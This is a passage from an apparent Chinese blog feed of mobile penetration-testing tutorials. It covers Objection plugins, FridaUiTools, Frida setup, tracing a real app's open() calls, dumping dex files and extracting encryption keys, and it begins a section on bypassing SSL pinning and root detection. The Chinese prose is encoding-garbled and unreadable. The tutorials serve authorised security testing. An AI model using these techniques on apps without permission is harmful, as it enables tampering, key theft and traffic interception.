class="line">plugin wallbreaker objectsearch com.example.androiddemo.Activity.LoginActivity</span><br><span class="line">//è¿”å›ï¼š</span><br><span class="line">[0x2262]: com.example.androiddemo.Activity.LoginActivity@d8a5160</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å¯¹è±¡çš„ä¸€äº›å±æ€§å’Œæ–¹æ³•</span><br><span class="line">plugin wallbreaker objectdump 0x2262 --fullname</span><br><span class="line"></span><br><span class="line"># è¾“å‡ºç±»ç»“æ„ï¼Œæ‰“å°æ•°æ®ä¸­ç±»çš„å®Œæ•´åŒ…å</span><br><span class="line">plugin wallbreaker classdump &lt;classname&gt; --fullname</span><br></pre></td></tr></table></figure></div><h3 id="FRIDA-DEXDump"><a href="#FRIDA-DEXDump" class="headerlink" title="FRIDA-DEXDump"></a>FRIDA-DEXDump</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â— æ’ä»¶åœ°å€</span><br><span class="line">https://github.com/hluwa/frida-dexdump</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â— åŠ è½½æ’ä»¶</span><br><span class="line">æ–¹æ³•ä¸€ï¼š</span><br><span class="line">objection -g com.example.androiddemo explore  -P ~/.objection/plugins/Wallbreaker(æ’ä»¶è·¯å¾„)</span><br><span class="line"></span><br><span class="line">æ–¹æ³•äºŒï¼š</span><br><span class="line">objection -g com.example.androiddemo explore</span><br><span class="line">plugin load ~/.objection/plugins/Wallbreaker(æ’ä»¶è·¯å¾„)</span><br><span class="line"></span><br><span class="line">â— æ’ä»¶ä½¿ç”¨</span><br><span class="line">plugin dexdump dump</span><br><span class="line">plugin dexdump search</span><br></pre></td></tr></table></figure></div><h3 id="watch-events"><a href="#watch-events" class="headerlink" title="watch_events"></a>watch_events</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â— æ’ä»¶åœ°å€</span><br><span class="line">https://github.com/hluwa/objection-plugins</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â— åŠ è½½æ’ä»¶</span><br><span class="line">æ–¹æ³•ä¸€ï¼š</span><br><span class="line">objection -g com.example.androiddemo explore  -P ~/.objection/plugins/Wallbreaker(æ’ä»¶è·¯å¾„)</span><br><span class="line"></span><br><span class="line">æ–¹æ³•äºŒï¼š</span><br><span class="line">objection -g com.example.androiddemo explore</span><br><span class="line">plugin load ~/.objection/plugins/Wallbreaker(æ’ä»¶è·¯å¾„)</span><br><span class="line"></span><br><span class="line">â— æ’ä»¶ä½¿ç”¨</span><br><span class="line">plugin watch_event onclick//ç›‘æ§ç‚¹å‡»äº‹ä»¶ï¼Œå¹¶æ‰“å°å‡ºç±»ï¼Œ</span><br></pre></td></tr></table></figure></div><h2 id="äº”ã€å‚è€ƒ"><a href="#äº”ã€å‚è€ƒ" class="headerlink" title="äº”ã€å‚è€ƒ"></a>äº”ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://bbs.kanxue.com/thread-277929.htm</span><br><span class="line">https://www.cnblogs.com/lxh2cwl/p/14842544.html</span><br><span class="line">https://mabin004.github.io/2020/08/13/objectionæ“ä½œ</span><br><span class="line">https://kuizuo.cn/docs/objection-note/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
          <category> ç§»åŠ¨å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·ä½¿ç”¨ </tag>
            
            <tag> Objection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç§»åŠ¨å®‰å…¨-FridaUiTools å·¥å…·ä½¿ç”¨</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-FridaUiTools%20%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-FridaUiTools%20%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>fridaUiTools ä¸º frida å¸¸ç”¨çš„è„šæœ¬çš„å›¾å½¢åŒ–ç®¡ç†å·¥å…·ï¼Œé›†æˆå¸¸ç”¨çš„ frida scriptï¼Œä¾¿äºæµ‹è¯•ã€‚é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/dqzg12300/fridaUiTools">https://github.com/dqzg12300/fridaUiTools</a></p><h2 id="äºŒã€åŸºæœ¬ä½¿ç”¨"><a href="#äºŒã€åŸºæœ¬ä½¿ç”¨" class="headerlink" title="äºŒã€åŸºæœ¬ä½¿ç”¨"></a>äºŒã€åŸºæœ¬ä½¿ç”¨</h2><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>é¦–å…ˆéœ€è¦ä¸Šä¼ ç›¸åº”ç‰ˆæœ¬çš„ frida-server è‡³æ‰‹æœºä¸Šçš„  <strong>&#x2F;data&#x2F;local&#x2F;tmp</strong> å¹¶å°† frida-server <strong>é‡å‘½åä¸º fserver64</strong> ï¼Œè¿™ä¸€æ­¥å·¥å…·è‡ªå¸¦äº† frida-server åªéœ€è¦æ‰§è¡Œä¸Šä¼ å³å¯ã€‚è€Œæˆ‘ä»¬åˆ™éœ€è¦å°† adb æ”¾ç½®åœ¨ fridaUiTools ç›®å½•ä¸‹ï¼Œå¦åˆ™æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚<a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225165810734.png" data-caption="image-20231225165810734"><img src="/../images/mobile/frida/2/image-20231225165810734.png" alt="image-20231225165810734"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225162857970.png" data-caption="image-20231225162857970"><img src="/../images/mobile/frida/2/image-20231225162857970.png" alt="image-20231225162857970"></a></p><p>å…¶æ¬¡åœ¨å·¥å…·å·¦ä¸Šæ–¹ <strong>æ‰§è¡Œ -&gt; å¯åŠ¨ frida-server -&gt; frida-server for arm64</strong>ï¼Œç‚¹å‡»å fridaUiTools ä¼šè°ƒç”¨ cmd ç»ˆç«¯æ‰§è¡Œ <strong>adb shell su -c â€˜&#x2F;data&#x2F;local&#x2F;tmp&#x2F;fserver64 -l 0.0.0.0:7777â€™</strong> å‘½ä»¤å¯åŠ¨ frida-server</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225163318454.png" data-caption="image-20231225163318454"><img src="/../images/mobile/frida/2/image-20231225163318454.png" alt="image-20231225163318454"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225163446608.png" data-caption="image-20231225163446608"><img src="/../images/mobile/frida/2/image-20231225163446608.png" alt="image-20231225163446608"></a></p><p>æœ€ååœ¨å·¥å…·ä¸Šæ–¹ç‚¹å‡» <strong>æ‰§è¡Œ -&gt; é™„åŠ è¿›ç¨‹ -&gt; é™„åŠ å½“å‰è¿›ç¨‹</strong> æˆ–è€…æŒ‡å®šéƒ½å¯ä»¥<a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225162732801.png" data-caption="image-20231225162732801"><img src="/../images/mobile/frida/2/image-20231225162732801.png" alt="image-20231225162732801"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225163446608.png" data-caption="image-20231225163446608"><img src="/../images/mobile/frida/2/image-20231225163446608.png" alt="image-20231225163446608"></a></p><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>æƒ³è¦è¿›è¡Œè‡ªåŠ¨æ‰¾å¯»åŠ è§£å¯†å‡½æ•°ï¼Œå…ˆåœæ­¢ç¨‹åºï¼Œå‹¾é€‰ <strong>javaåŠ è§£å¯†</strong> ç„¶åé‡æ–°å¯åŠ¨ï¼Œæ‰‹æœºä¸Šæ‰“å¼€å¾…æµ‹appä¾‹å­ï¼šè·å– APP åŠ è§£å¯†å‡½æ•°ç®—æ³•åŠç›¸å…³è°ƒç”¨æ ˆã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225164100525-17077407867265.png" data-caption="image-20231225164100525"><img src="/../images/mobile/frida/2/image-20231225164100525-17077407867265.png" alt="image-20231225164100525"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225164143428.png" data-caption="image-20231225164143428"><img src="/../images/mobile/frida/2/image-20231225164143428.png" alt="image-20231225164143428"></a></p><p>æ‰‹æœºä¸Šæ‰§è¡Œç™»å½•ï¼Œ fridaUiTools è‡ªåŠ¨æ‰¾å¯»åŠ è§£å¯†çš„ç®—æ³•è¿”å›ç›¸å…³å¯†é’¥ä»¥åŠè°ƒç”¨æ ˆï¼Œæ–¹ä¾¿å®šä½ã€‚ç„¶åå°±å¯ä»¥åˆ©ç”¨ jadx æ‰“å¼€ apk æ ¹æ®è°ƒç”¨æ ˆå®šä½ä»£ç è¿›è€Œè¿›è¡Œä»£ç åˆ†æã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225164237474-17077407036183.png" data-caption="image-20231225164237474"><img src="/../images/mobile/frida/2/image-20231225164237474-17077407036183.png" alt="image-20231225164237474"></a></p><p>ç‚¹å‡»è°ƒç”¨ Wallbreaker é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/hluwa/Wallbreaker%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%88%86%E6%9E%90">https://github.com/hluwa/Wallbreakerï¼Œç”¨æ¥åˆ†æ</a> Java ç±»&#x2F;å¯¹è±¡ç»“æ„</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/2/image-20231225165059039-17077513060477.png" data-caption="image-20231225165059039"><img src="/../images/mobile/frida/2/image-20231225165059039-17077513060477.png" alt="image-20231225165059039"></a></p><p>è¿˜æœ‰å…¶å®ƒåŠŸèƒ½å¯è‡ªè¡Œå»æ¢ç´¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
          <category> ç§»åŠ¨å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·ä½¿ç”¨ </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç§»åŠ¨å®‰å…¨-Frida åº”ç”¨åˆ†æåŠæ¡ˆä¾‹å®è·µ</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Frida%20%E5%BA%94%E7%94%A8%E5%88%86%E6%9E%90%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%AE%9E%E8%B7%B5/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Frida%20%E5%BA%94%E7%94%A8%E5%88%86%E6%9E%90%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€Frida-ç®€ä»‹"><a href="#ä¸€ã€Frida-ç®€ä»‹" class="headerlink" title="ä¸€ã€Frida ç®€ä»‹"></a>ä¸€ã€Frida ç®€ä»‹</h2><p>Frida æ˜¯æ ¸å¿ƒå¼•æ“ä½¿ç”¨ C å†™çš„ä¸€æ¬¾åŠ¨æ€åˆ†æå·¥å…·ï¼Œé€šè¿‡ Frida æˆ‘ä»¬å¯ä»¥æŠŠä¸€æ®µ JavaScriptã€Python ç­‰ä»£ç æ³¨å…¥åˆ°ä¸€ä¸ªæ­£åœ¨è¿è¡Œä¸­çš„åº”ç”¨ç¨‹åºè¿›ç¨‹ä¸­å»ã€‚</p><h3 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h3><p>Frida æ³¨å…¥ä»£ç çš„è¿‡ç¨‹é€šå¸¸è¢«ç§°ä¸º Hookï¼ˆé’©å­ï¼‰ã€‚åœ¨è¿è¡Œä¸­çš„åº”ç”¨ç¨‹åºæ‹¦æˆªå’Œä¿®æ”¹å‡½æ•°æˆ–æ–¹æ³•çš„æ‰§è¡Œæµç¨‹ç§°ä¸º Hooking ã€‚é€šè¿‡ Hookï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç›®æ ‡åº”ç”¨ç¨‹åºçš„æŒ‡å®šå‡½æ•°æ‰§è¡Œå‰æˆ–æ‰§è¡Œåæ’å…¥è‡ªå®šä¹‰çš„ä»£ç ï¼Œä»è€Œæ”¹å˜å‡½æ•°çš„è¡Œä¸ºæˆ–æ•è·å…³é”®ä¿¡æ¯ã€‚æ¢ä¸ªæ€è·¯ç†è§£å°±ç±»ä¼¼äºæˆ‘ä»¬æ—¥å¸¸ Burp æŠ“åŒ…ä¿®æ”¹ï¼Œä½† Hook éœ€è¦å®šä½åˆ°ç›¸åº”çš„å‡½æ•°ï¼Œç„¶åé€šè¿‡ç¼–å†™ Hook è„šæœ¬ä¿®æ”¹å…¶å‡½æ•°çš„è¡Œä¸ºæˆ–è€…è¾¾åˆ°å…¶å®ƒç›®çš„ï¼Œé€šå¸¸åŸºæœ¬çš„è„šæœ¬ç¼–å†™ä½¿ç”¨ Javascript æˆ–è€… Pythonï¼Œä½† Frida è¿˜æä¾›äº† Node.jsã€ Swiftã€.netã€Qml ç­‰è¯­è¨€çš„æ¥å£å°è£…ï¼Œæ ¹æ®ä¸ªäººé€‰æ‹©ã€‚</p><p>Frida æ³¨å…¥ä»£ç çš„è¿‡ç¨‹é€šå¸¸è¢«ç§°ä¸º Hookï¼ˆé’©å­ï¼‰ã€‚åœ¨è¿è¡Œä¸­çš„åº”ç”¨ç¨‹åºæ‹¦æˆªå’Œä¿®æ”¹å‡½æ•°æˆ–æ–¹æ³•çš„æ‰§è¡Œæµç¨‹ç§°ä¸º Hooking ã€‚é€šè¿‡ Hookï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç›®æ ‡åº”ç”¨ç¨‹åºçš„æŒ‡å®šå‡½æ•°æ‰§è¡Œå‰æˆ–æ‰§è¡Œåæ’å…¥è‡ªå®šä¹‰çš„ä»£ç ï¼Œä»è€Œæ”¹å˜å‡½æ•°çš„è¡Œä¸ºæˆ–æ•è·å…³é”®ä¿¡æ¯ã€‚æ¢ä¸ªæ€è·¯ç†è§£å°±ç±»ä¼¼äºæˆ‘ä»¬æ—¥å¸¸ Burp æŠ“åŒ…ä¿®æ”¹ï¼Œä½† Hook éœ€è¦å®šä½åˆ°ç›¸åº”çš„å‡½æ•°ï¼Œç„¶åé€šè¿‡ç¼–å†™ Hook è„šæœ¬ä¿®æ”¹å…¶å‡½æ•°çš„è¡Œä¸ºæˆ–è€…è¾¾åˆ°å…¶å®ƒç›®çš„ï¼Œé€šå¸¸åŸºæœ¬çš„ç¼–å†™ä½¿ç”¨ Javascript æˆ–è€… Pythonï¼Œä½†Frida è¿˜æä¾›äº† Node.jsã€ Swiftã€.netã€Qml ç­‰è¯­è¨€çš„æ¥å£å°è£…ï¼Œæ ¹æ®ä¸ªäººé€‰æ‹©ã€‚</p><h3 id="ç›¸åº”åŠŸèƒ½"><a href="#ç›¸åº”åŠŸèƒ½" class="headerlink" title="ç›¸åº”åŠŸèƒ½"></a>ç›¸åº”åŠŸèƒ½</h3><p>åœ¨å®é™…æµ‹è¯•ä¸­ï¼ŒFrida ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§åŠŸèƒ½å¯è¾…åŠ©å®‰å…¨æµ‹è¯•äººå‘˜è¿›è¡Œæµ‹è¯•ã€‚</p><ul><li>ç›‘è§†åŠ å¯†API</li><li>ä¿®æ”¹å‡½æ•°çš„è¾“å‡º</li><li>ç»•è¿‡ AES åŠ å¯†</li><li>ç»•è¿‡ SSL Pinningã€ROOT æ£€æµ‹</li><li>è¿½è¸ªåº”ç”¨ä»£ç </li><li>è„±å£³</li><li>â€¦â€¦</li></ul><h2 id="äºŒã€å·¥å…·å®‰è£…"><a href="#äºŒã€å·¥å…·å®‰è£…" class="headerlink" title="äºŒã€å·¥å…·å®‰è£…"></a>äºŒã€å·¥å…·å®‰è£…</h2><p>frida åˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä¸€èˆ¬åœ¨ç›®æ ‡è®¾å¤‡ä¸Šè¿è¡Œçš„ï¼Œå®¢æˆ·ç«¯åˆ™åœ¨å¼€å‘æœºä¸Šè¿è¡Œï¼Œå¦‚å¯¹ Android APP çš„è°ƒè¯•ï¼ŒæœåŠ¡ç«¯æ”¾åœ¨ Android è®¾å¤‡ä¸Šï¼Œè€Œå®¢æˆ·ç«¯åˆ™åœ¨æˆ‘ä»¬è‡ªå·±çš„ç”µè„‘ä¸Šå®‰è£…å³å¯ã€‚<strong>ï¼ˆæ³¨æ„ï¼šæœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯çš„ frida ç‰ˆæœ¬éœ€è¦ä¸€è‡´ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°æŠ¥é”™ï¼‰</strong></p><p>1ã€æœåŠ¡ç«¯ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://github.com/frida/frida%EF%BC%8C%E9%80%89%E6%8B%A9">https://github.com/frida/fridaï¼Œé€‰æ‹©</a> android-arm64.xz ç‰ˆæœ¬</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125132155193.png" data-caption="image-20231125132155193"><img src="/../images/mobile/frida/1/image-20231125132155193.png" alt="image-20231125132155193"></a></p><p>ä½¿ç”¨ adb ä¸Šä¼ è‡³æ‰‹æœºä¸­ï¼Œadb ä¸‹è½½åœ°å€ï¼š<a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn%EF%BC%88%E5%9C%A8%E8%BF%9B%E8%A1%8C">https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cnï¼ˆåœ¨è¿›è¡Œ</a> Android  APP è°ƒè¯•ï¼Œæµ‹è¯•æœºè®°å¾— ROOTï¼Œè¿™è¾¹ä¸èµ˜è¿°ï¼‰, ä»¥ä¸‹æ‰§è¡Œå¯çŸ¥ï¼Œadb shell è¿›å…¥åä¸º $ ,å³é»˜è®¤æƒé™ä¸ºæ™®é€šæƒé™ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125131931077.png" data-caption="image-20231125131931077"><img src="/../images/mobile/frida/1/image-20231125131931077.png" alt="image-20231125131931077"></a></p><p>æœ¬äººä¸Šä¼ çš„ä¸º data ç›®å½•ï¼Œéœ€è¦ root æƒé™ï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œä¸Šä¼ æ–‡ä»¶å‰ï¼Œå…ˆæ‰§è¡Œ adb root ï¼Œç„¶åæ‰‹æœºä¸Šç‚¹å‡»å…è®¸è°ƒè¯•ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125134232951.png" data-caption="image-20231125134232951"><img src="/../images/mobile/frida/1/image-20231125134232951.png" alt="image-20231125134232951"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push D:\app\test\frida-server-16.1.6-android-arm64 /data/app_test</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125134927921.png" data-caption="image-20231125134927921"><img src="/../images/mobile/frida/1/image-20231125134927921.png" alt="image-20231125134927921"></a></p><p>è¿›å…¥ adb shell å°†ä¸Šä¼ çš„ frida ç»™äºˆè¿è¡Œæƒé™</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd /data/app_test</span><br><span class="line">chmod 777 frida-server-16.1.6-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125134816019.png" data-caption="image-20231125134816019"><img src="/../images/mobile/frida/1/image-20231125134816019.png" alt="image-20231125134816019"></a></p><p>2ã€å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯ frida å®‰è£…è¾ƒä¸ºç®€å•ï¼Œç›´æ¥ä½¿ç”¨ pip3 è¿›è¡Œå®‰è£…å³å¯ï¼Œä½†éœ€è¦ python3.x ç¯å¢ƒï¼Œè¿™è¾¹ä½¿ç”¨ python 3.9 è¿›è¡Œå®‰è£…ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida// å®‰è£… frida</span><br><span class="line">pip3 install frida==16.1.6 //æŒ‡å®šç‰ˆæœ¬å®‰è£…</span><br><span class="line">pip3 install frida-tools // å®‰è£… frida cli å·¥å…·ï¼Œå¯è¿è¡Œ frida æŸäº›å‘½ä»¤</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125135652353.png" data-caption="image-20231125135652353"><img src="/../images/mobile/frida/1/image-20231125135652353.png" alt="image-20231125135652353"></a></p><p>3ã€éªŒè¯ï¼Œå…ˆåœ¨ Android è®¾å¤‡è¿›å…¥ frida-server æ‰€åœ¨ç›®å½•è¿è¡Œ frida-server å¯åŠ¨æœåŠ¡ç«¯<strong>ï¼ˆæœåŠ¡ç«¯æœ€å¥½ä¿®æ”¹ä¸€ä¸‹åç§°ï¼Œéƒ¨åˆ†å®‰å…¨åŠ å›ºä¼šå°†frida å­—æ®µè¿›è¡Œå®‰å…¨æ£€æµ‹ï¼‰</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-16.1.6-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125135907946.png" data-caption="image-20231125135907946"><img src="/../images/mobile/frida/1/image-20231125135907946.png" alt="image-20231125135907946"></a></p><p>åœ¨ç”µè„‘ä¸Šä½¿ç”¨ frida-tools è‡ªå¸¦å‘½ä»¤ï¼ŒæŸ¥çœ‹æ˜¯å¦å·²ç»å’Œæ‰‹æœºè¿æ¥äº†ï¼Œä¸‹å›¾ä½¿ç”¨ frida-ps -Uia å‘½ä»¤æŸ¥çœ‹æ‰‹æœºä¸Šæ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼Œè¯æ˜æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯é€šè®¯æ­£å¸¸</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125140543748.png" data-caption="image-20231125140543748"><img src="/../images/mobile/frida/1/image-20231125140543748.png" alt="image-20231125140543748"></a></p><h2 id="ä¸‰ã€å®è·µæ¡ˆä¾‹"><a href="#ä¸‰ã€å®è·µæ¡ˆä¾‹" class="headerlink" title="ä¸‰ã€å®è·µæ¡ˆä¾‹"></a>ä¸‰ã€å®è·µæ¡ˆä¾‹</h2><h3 id="è¿½è¸ªç¨‹åºå‡½æ•°"><a href="#è¿½è¸ªç¨‹åºå‡½æ•°" class="headerlink" title="è¿½è¸ªç¨‹åºå‡½æ•°"></a>è¿½è¸ªç¨‹åºå‡½æ•°</h3><p>è¿™è¾¹è¿½è¸ªæŸ APP  open()å‡½æ•°ï¼ŒæŸ¥çœ‹å…¶è¾“å‡ºæƒ…å†µå¦‚ä½•ã€‚</p><p>1ã€å¯åŠ¨æœåŠ¡ç«¯ï¼ˆå³æ‰‹æœºä¸Šè¿è¡Œ frida-serverï¼‰</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-16.1.6-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125212854538.png" data-caption="image-20231125212854538"><img src="/../images/mobile/frida/1/image-20231125212854538.png" alt="image-20231125212854538"></a></p><p>2ã€å®¢æˆ·ç«¯ï¼ˆç”µè„‘ä¸Šï¼‰è¿›è¡Œè¿½è¸ª open() å‡½æ•°ï¼Œé¦–å…ˆæŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„ç¨‹åºè·å–åŒ…å</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125213212970.png" data-caption="image-20231125213212970"><img src="/../images/mobile/frida/1/image-20231125213212970.png" alt="image-20231125213212970"></a></p><p>é€‰æ‹©å…¶ä¸­ä¸€ä¸ªå¸¦æœ‰ open() å‡½æ•°çš„ç¨‹åºè¿›è¡Œè¿½è¸ªã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -i open com.tencent.android.qqdownloader</span><br></pre></td></tr></table></figure></div><p>ç­‰å¾…ä¸€æ®µæ—¶é—´åï¼Œfrida å¼€å§‹ trace åˆ°åå°æ­£åœ¨è¿è¡Œç¨‹åºçš„ open() </p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125213641791.png" data-caption="image-20231125213641791"><img src="/../images/mobile/frida/1/image-20231125213641791.png" alt="image-20231125213641791"></a></p><p>æ‰“å¼€ APP ç¨‹åºä¼šå‘ç° frida trace åˆ°å¤§é‡è°ƒç”¨ open() å‡½æ•°</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125213758207.png" data-caption="image-20231125213758207"><img src="/../images/mobile/frida/1/image-20231125213758207.png" alt="image-20231125213758207"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231125213957887.png" data-caption="image-20231125213957887"><img src="/../images/mobile/frida/1/image-20231125213957887.png" alt="image-20231125213957887"></a></p><h3 id="Bypass-SSL-Pinning-amp-ROOT"><a href="#Bypass-SSL-Pinning-amp-ROOT" class="headerlink" title="Bypass SSL Pinning &amp; ROOT"></a>Bypass SSL Pinning &amp; ROOT</h3><p>ç½‘ä¸Š search çš„ bypass è„šæœ¬ï¼Œå…·ä½“åœ°å€é—å¿˜äº†</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 